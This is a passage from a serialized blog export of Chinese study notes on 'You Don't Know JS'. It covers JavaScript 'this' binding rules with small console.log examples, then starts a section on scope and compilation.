class=\"line\">///////////////////////</span><br><span class=\"line\">function foo2() &#123;</span><br><span class=\"line\">\t&quot;use strict&quot;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a =2</span><br><span class=\"line\">foo2() \t\t// typeerror</span><br><span class=\"line\">////////////////////////</span><br><span class=\"line\">function foo3() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a =2</span><br><span class=\"line\">(function () &#123;</span><br><span class=\"line\">\t&quot;use strict&quot;</span><br><span class=\"line\">\tfoo3()\t\t// 2</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure><p>在非严格模式下，foo的调用默认指向调用位置，例子中是全局，而在严格模式下会抛出异常，在严格模式调用其他位置的this，也可以调用。</p><h5 id=\"隐式绑定\"><a href=\"#隐式绑定\" class=\"headerlink\" title=\"隐式绑定\"></a>隐式绑定</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta : 2,</span><br><span class=\"line\">\tfoo : foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo \t// 2</span><br></pre></td></tr></table></figure><p>在代码中，foo默认是绑定在obj的foo的属性上，因此隐式的把foo中的this绑定在obj之上，调用的也是obj中的a<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj2 = &#123;</span><br><span class=\"line\">\ta:42,</span><br><span class=\"line\">\tfoo:foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj1 = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tobj2: obj2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj1.obj2.foo() \t// 42</span><br></pre></td></tr></table></figure><p></p><p>在上面的代码中，经过多层的调用，但是最终结果还是指向的是最后一层调用的位置。因此可以的出结论。在对象属性引用链中只有上一层或者说最后一层在调用位置中起作用。</p><h5 id=\"隐式丢失\"><a href=\"#隐式丢失\" class=\"headerlink\" title=\"隐式丢失\"></a>隐式丢失</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 隐式丢失，成为默认绑定</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = obj.foo</span><br><span class=\"line\">var a = &quot;this is global&quot;</span><br><span class=\"line\">bar()\t\t\t// this is global</span><br><span class=\"line\">////////////////////////////////////////</span><br><span class=\"line\">// 回调的隐式丢失</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function doFoo(fn) &#123;</span><br><span class=\"line\">\t// fn其实引用的是foo</span><br><span class=\"line\">\tfn()\t\t// 调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = &quot;this is global&quot;</span><br><span class=\"line\">doFoo(obj.foo)\t// this is global</span><br></pre></td></tr></table></figure><p>虽然bar是obj.foo的一个引用，但实际上，它引用的是foo函数本身，因此此时的bar()其实是一个不带任何修饰的函数调用，因此引用了默认绑定。<br>第二种情况也是如此，在回调时的隐式丢失导致的问题<br>这也导致setTimeout中的隐式丢失，常用方法是将this绑定到一个变量中，这样就不会导致隐式丢失</p><h5 id=\"显式绑定\"><a href=\"#显式绑定\" class=\"headerlink\" title=\"显式绑定\"></a>显式绑定</h5><p>使用call，和apply方法绑定。<br><strong>1、硬绑定</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = function () &#123;</span><br><span class=\"line\">\tfoo.call(obj)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bar()\t\t// 2</span><br><span class=\"line\">setTimeout(bar, 100)\t// 2</span><br><span class=\"line\">bar.call(window)\t// 2</span><br></pre></td></tr></table></figure><p></p><p>无论是强制显示调用window，他都是2.因为在bar这个函数中调用了foo.call(obj)，最终都会绑定到obj上。为了硬绑定的应用，ES5中有bind方法，专门用于绑定。</p><p><strong>API调用的“上下文”</strong><br>和bind一样，他的作用是保证回调<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(el) &#123;</span><br><span class=\"line\">\tconsole.log(el, this.id)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\tid: &quot;awesome&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">[1, 2, 3].forEach(foo, obj) \t// 调用时将this绑定到obj上</span><br></pre></td></tr></table></figure><p></p><p><strong>new 绑定</strong><br>使用new来调用函数，会自动执行以下操作：<br>1、创建一个全新的对象<br>2、这个新对象会被执行[[Prototype]]连接<br>3、这个新对象会绑定到函数调用的this<br>4、如果函数没有返回其他对象，那么new表达式中的函数中会自动调用这个对象<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(a)&#123;</span><br><span class=\"line\">\tthis.a = a</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = new foo(2)</span><br><span class=\"line\">console.log(bar.a)\t\t// 2</span><br><span class=\"line\">``` </span><br><span class=\"line\">_ps：优先级------&gt;new绑定&gt;显示绑定&gt;隐式绑定&gt;默认绑定_</span><br><span class=\"line\">### 判断this</span><br><span class=\"line\">1、函数是否在new中调用(new绑定)？如果是的话this绑定是新的对象</span><br><span class=\"line\">2、函数是否通过call、apply(显示绑定)或者硬绑定的调用？如果是的话this绑定的是制定对象</span><br><span class=\"line\">3、函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this绑定到那个上下文对象中</span><br><span class=\"line\">4、如果都不是的话，使用默认绑定，在严格模式下，就绑定到undefined上，否则绑定到全局对象上。</span><br><span class=\"line\">##### 例外</span><br><span class=\"line\">```bash</span><br><span class=\"line\">function foo()&#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2</span><br><span class=\"line\">foo.call(null)\t// 默认绑定</span><br><span class=\"line\">///////////////////////////////////</span><br><span class=\"line\">// 科里化</span><br><span class=\"line\">function foo(a, b) &#123;</span><br><span class=\"line\">\tconsole.log(&quot;a:&quot; + a +&quot; , b: &quot; + b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.apply(null, [2,3])\t// a:2,b:3</span><br><span class=\"line\">var bar = foo.bind(null, 2)</span><br><span class=\"line\">bar(3)</span><br><span class=\"line\">///////////////////////////////////</span><br><span class=\"line\">// 间接引用</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2</span><br><span class=\"line\">var o = &#123;a:3, foo: foo&#125;</span><br><span class=\"line\">var p = &#123;a:4&#125;</span><br><span class=\"line\">o.foo() \t// 3</span><br><span class=\"line\">(p.foo = o.foo)() \t// 2</span><br><span class=\"line\">// 复制表达式p.foo = o.foo的返回值是目标函数的引用，因此调用位置是foo()而不是p.foo或者o.foo</span><br></pre></td></tr></table></figure><p></p><h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><p>在string中，本身的字符串“I am a string”并不是一个对象，而是一个字面量，在使用了对象的方法之后，javascript会自动将其转换成一个string对象<br>null和undefined没有对应的构造函数，他们只有文字形式。相反，Date只有构造函数，没有文字形式。<br>对于Object，Array，Function和RegExp来说，无论是文字形式还是构造形式，他们都是对象不是字面量。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"this误解\"><a href=\"#this误解\" class=\"headerlink\" title=\"this误解\"></a>this误解</h3><p>从字面意思来看,this貌似是指向自身的.因此出现各种各样的误解.</p><h5 id=\"指向自身\"><a href=\"#指向自身\" class=\"headerlink\" title=\"指向自身\"></a>指向自身</h5><p>先看一个demo<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(num) &#123;</span><br><span class=\"line\">\tconsole.log(&quot;foo: &quot; + num);</span><br><span class=\"line\">\tthis.count++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.count = 0;</span><br><span class=\"line\">var i;</span><br><span class=\"line\">for (i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">\tif(i &gt; 5) &#123;</span><br><span class=\"line\">\t\tfoo(i)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// foo: 6</span><br><span class=\"line\">// foo: 7</span><br><span class=\"line\">// foo: 8</span><br><span class=\"line\">// foo: 9</span><br><span class=\"line\">console.log(this.count)\t// NaN</span><br></pre></td></tr></table></figure><p></p><p>从上述例子中,可以很清楚的看到函数被调用了四次,而为什么打印出来的this.count是NaN呢?显然this指向的count并不是函数的count.的确在foo.count=0的时候给对象foo加了一个count,但是内部代码this.count却不是指向的那个函数对象.从第二章的理解当中,不难发现,其创建了一个全局count,并且它是NaN.</p><h3 id=\"this是什么\"><a href=\"#this是什么\" class=\"headerlink\" title=\"this是什么?\"></a>this是什么?</h3><p>this是在运行时绑定的,并不是在编写时绑定的.他的上下文取决于函数调用时的各种条件,this绑定和函数声明没有任何关系,取决于函数的调用方式.</p><p>当一个函数被调用时,会创建一个活动记录(有时候称之为上下文).这个记录会包含函数在哪里被调用(调用栈)、函数的调用方式、传入的参数信息,而this就是这个记录的一个属性。会在函数执行过程中用到。</p><p><em>PS:说白了，THIS实际上是在函数调用时发生的绑定，他指向什么完全取决于函数在哪里被调用。</em></p><h5 id=\"调用位置\"><a href=\"#调用位置\" class=\"headerlink\" title=\"调用位置\"></a>调用位置</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function baz() &#123;</span><br><span class=\"line\">\t// 当前作用栈是： baz</span><br><span class=\"line\">\t// 因此调用位置是全局作用域</span><br><span class=\"line\">\tconsole.log(&quot;baz&quot;)</span><br><span class=\"line\">\tbar()\t\t\t// &lt;-- bar的调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function bar() &#123;</span><br><span class=\"line\">\t// 当前调用栈是baz -&gt; bar</span><br><span class=\"line\">\t// 因此调用位置是baz中</span><br><span class=\"line\">\tconsole.log(&quot;bar&quot;)</span><br><span class=\"line\">\tfoo();\t\t// &lt;-- foo的调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\t// 当前调用栈是baz -&gt; bar -&gt; foo</span><br><span class=\"line\">\t// 当前调用位置在bar中</span><br><span class=\"line\">\tconsole.log(&quot;foo&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">baz()    // &lt;-- baz的调用位置</span><br></pre></td></tr></table></figure><p>从上述调用栈，可以分析出真正的调用位置，他决定了this的绑定</p><h3 id=\"四种绑定规则\"><a href=\"#四种绑定规则\" class=\"headerlink\" title=\"四种绑定规则\"></a>四种绑定规则</h3><h5 id=\"默认绑定\"><a href=\"#默认绑定\" class=\"headerlink\" title=\"默认绑定\"></a>默认绑定</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\">foo();\t// 2</span><br><span class=\"line\">///////////////////////</span><br><span class=\"line\">function foo2() &#123;</span><br><span class=\"line\">\t&quot;use strict&quot;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a =2</span><br><span class=\"line\">foo2() \t\t// typeerror</span><br><span class=\"line\">////////////////////////</span><br><span class=\"line\">function foo3() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a =2</span><br><span class=\"line\">(function () &#123;</span><br><span class=\"line\">\t&quot;use strict&quot;</span><br><span class=\"line\">\tfoo3()\t\t// 2</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure><p>在非严格模式下，foo的调用默认指向调用位置，例子中是全局，而在严格模式下会抛出异常，在严格模式调用其他位置的this，也可以调用。</p><h5 id=\"隐式绑定\"><a href=\"#隐式绑定\" class=\"headerlink\" title=\"隐式绑定\"></a>隐式绑定</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta : 2,</span><br><span class=\"line\">\tfoo : foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj.foo \t// 2</span><br></pre></td></tr></table></figure><p>在代码中，foo默认是绑定在obj的foo的属性上，因此隐式的把foo中的this绑定在obj之上，调用的也是obj中的a<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj2 = &#123;</span><br><span class=\"line\">\ta:42,</span><br><span class=\"line\">\tfoo:foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj1 = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tobj2: obj2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">obj1.obj2.foo() \t// 42</span><br></pre></td></tr></table></figure><p></p><p>在上面的代码中，经过多层的调用，但是最终结果还是指向的是最后一层调用的位置。因此可以的出结论。在对象属性引用链中只有上一层或者说最后一层在调用位置中起作用。</p><h5 id=\"隐式丢失\"><a href=\"#隐式丢失\" class=\"headerlink\" title=\"隐式丢失\"></a>隐式丢失</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 隐式丢失，成为默认绑定</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = obj.foo</span><br><span class=\"line\">var a = &quot;this is global&quot;</span><br><span class=\"line\">bar()\t\t\t// this is global</span><br><span class=\"line\">////////////////////////////////////////</span><br><span class=\"line\">// 回调的隐式丢失</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function doFoo(fn) &#123;</span><br><span class=\"line\">\t// fn其实引用的是foo</span><br><span class=\"line\">\tfn()\t\t// 调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 2,</span><br><span class=\"line\">\tfoo: foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = &quot;this is global&quot;</span><br><span class=\"line\">doFoo(obj.foo)\t// this is global</span><br></pre></td></tr></table></figure><p>虽然bar是obj.foo的一个引用，但实际上，它引用的是foo函数本身，因此此时的bar()其实是一个不带任何修饰的函数调用，因此引用了默认绑定。<br>第二种情况也是如此，在回调时的隐式丢失导致的问题<br>这也导致setTimeout中的隐式丢失，常用方法是将this绑定到一个变量中，这样就不会导致隐式丢失</p><h5 id=\"显式绑定\"><a href=\"#显式绑定\" class=\"headerlink\" title=\"显式绑定\"></a>显式绑定</h5><p>使用call，和apply方法绑定。<br><strong>1、硬绑定</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = function () &#123;</span><br><span class=\"line\">\tfoo.call(obj)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bar()\t\t// 2</span><br><span class=\"line\">setTimeout(bar, 100)\t// 2</span><br><span class=\"line\">bar.call(window)\t// 2</span><br></pre></td></tr></table></figure><p></p><p>无论是强制显示调用window，他都是2.因为在bar这个函数中调用了foo.call(obj)，最终都会绑定到obj上。为了硬绑定的应用，ES5中有bind方法，专门用于绑定。</p><p><strong>API调用的“上下文”</strong><br>和bind一样，他的作用是保证回调<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(el) &#123;</span><br><span class=\"line\">\tconsole.log(el, this.id)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\tid: &quot;awesome&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">[1, 2, 3].forEach(foo, obj) \t// 调用时将this绑定到obj上</span><br></pre></td></tr></table></figure><p></p><p><strong>new 绑定</strong><br>使用new来调用函数，会自动执行以下操作：<br>1、创建一个全新的对象<br>2、这个新对象会被执行[[Prototype]]连接<br>3、这个新对象会绑定到函数调用的this<br>4、如果函数没有返回其他对象，那么new表达式中的函数中会自动调用这个对象<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(a)&#123;</span><br><span class=\"line\">\tthis.a = a</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bar = new foo(2)</span><br><span class=\"line\">console.log(bar.a)\t\t// 2</span><br><span class=\"line\">``` </span><br><span class=\"line\">_ps：优先级------&gt;new绑定&gt;显示绑定&gt;隐式绑定&gt;默认绑定_</span><br><span class=\"line\">### 判断this</span><br><span class=\"line\">1、函数是否在new中调用(new绑定)？如果是的话this绑定是新的对象</span><br><span class=\"line\">2、函数是否通过call、apply(显示绑定)或者硬绑定的调用？如果是的话this绑定的是制定对象</span><br><span class=\"line\">3、函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this绑定到那个上下文对象中</span><br><span class=\"line\">4、如果都不是的话，使用默认绑定，在严格模式下，就绑定到undefined上，否则绑定到全局对象上。</span><br><span class=\"line\">##### 例外</span><br><span class=\"line\">```bash</span><br><span class=\"line\">function foo()&#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2</span><br><span class=\"line\">foo.call(null)\t// 默认绑定</span><br><span class=\"line\">///////////////////////////////////</span><br><span class=\"line\">// 科里化</span><br><span class=\"line\">function foo(a, b) &#123;</span><br><span class=\"line\">\tconsole.log(&quot;a:&quot; + a +&quot; , b: &quot; + b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.apply(null, [2,3])\t// a:2,b:3</span><br><span class=\"line\">var bar = foo.bind(null, 2)</span><br><span class=\"line\">bar(3)</span><br><span class=\"line\">///////////////////////////////////</span><br><span class=\"line\">// 间接引用</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2</span><br><span class=\"line\">var o = &#123;a:3, foo: foo&#125;</span><br><span class=\"line\">var p = &#123;a:4&#125;</span><br><span class=\"line\">o.foo() \t// 3</span><br><span class=\"line\">(p.foo = o.foo)() \t// 2</span><br><span class=\"line\">// 复制表达式p.foo = o.foo的返回值是目标函数的引用，因此调用位置是foo()而不是p.foo或者o.foo</span><br></pre></td></tr></table></figure><p></p><h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><p>在string中，本身的字符串“I am a string”并不是一个对象，而是一个字面量，在使用了对象的方法之后，javascript会自动将其转换成一个string对象<br>null和undefined没有对应的构造函数，他们只有文字形式。相反，Date只有构造函数，没有文字形式。<br>对于Object，Array，Function和RegExp来说，无论是文字形式还是构造形式，他们都是对象不是字面量。</p>"},{"title":"你不知道的JavaScript————作用域和闭包篇","date":"2017-08-19T12:20:32.000Z","dir":"javascript","keywords":"你不知道的JavaScript————作用域和闭包篇","_content":"### 编译原理\n为什么要把这个放在重点呢？因为每门语言的最底层，那就是编译成机器语言了。了解编译原理。对理解语言的特殊现象有很大帮助。\n先说说其他非脚本语言开始到结束。我在之前的计算机系统基础的篇目中学到C的编译。变成汇编语言之后，每个函数名字，每个变量名字，都会写入到一张表里面。而这张表，是将所有的变量放置在一起。查找匹配相应的变量，并寻找其变量地址。\n应该是所有的语言都是相似的。在了解过javascript编译原理之后。发现这很多相似的地方。\n\n##### 分词/词法分析\n将字符组成的字符串分解成有意义的代码块，代码块统称为词法单元\n例如：在 var a = 2。将会分解成 var, a, =, 2\n\n##### 解析/语法分析\n这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表程序语法结构的树（抽象语法树）。\n例如：var a = 2这个代码中，他可能有一个父节点，其本身节点a，其值为2\n\n##### 代码生成\n将抽象语法树转换成可执行代码的过程统称为代码生成。\n例如：var a = 2，创建一个a的变量，并且储存一个值为2在a中\n\nps：javascript中远复杂的多，在语法分析和代码生成阶段有特定性能进行优化。一般而言，javascript为了保证高效的执行代码，通常是函数片段执行钱然后进行编译。以保证代码性能的最佳\n\n### 